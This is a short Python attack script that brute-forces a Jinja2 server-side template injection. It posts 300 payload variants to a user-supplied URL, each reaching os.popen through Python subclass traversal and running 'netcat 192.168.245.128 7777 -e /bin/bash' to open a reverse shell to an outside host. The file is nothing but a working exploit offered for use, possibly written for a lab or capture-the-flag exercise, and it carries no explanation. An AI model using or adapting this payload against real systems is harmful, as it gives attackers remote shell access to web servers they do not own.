import requests

url = input("url:")
for i in range(300):
    try:
        data = {"code": '{{ ().__class__.__base__.__subclasses__()[' + str(
            i) + '].__init__.__globals__["popen"]("netcat 192.168.245.128 7777 -e /bin/bash").read() }}'}
        response = requests.post(url, data=data)
    except:
        pass
